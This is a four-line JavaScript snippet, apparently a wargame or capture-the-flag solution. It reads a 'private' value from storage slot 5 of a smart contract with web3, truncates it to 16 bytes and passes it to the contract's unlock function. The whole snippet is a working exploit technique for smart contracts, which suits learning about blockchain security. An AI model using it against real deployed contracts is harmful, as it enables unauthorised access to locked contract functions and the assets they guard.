//private storage variable does not mean it cannot be read from outside world
let key = await web3.eth.getStorageAt(contract.address, 5); //your inst address
key = key.slice(0, 34); //cut to 16 byte hex starting with 0x
await contract.unlock(key); //now it's unlocked
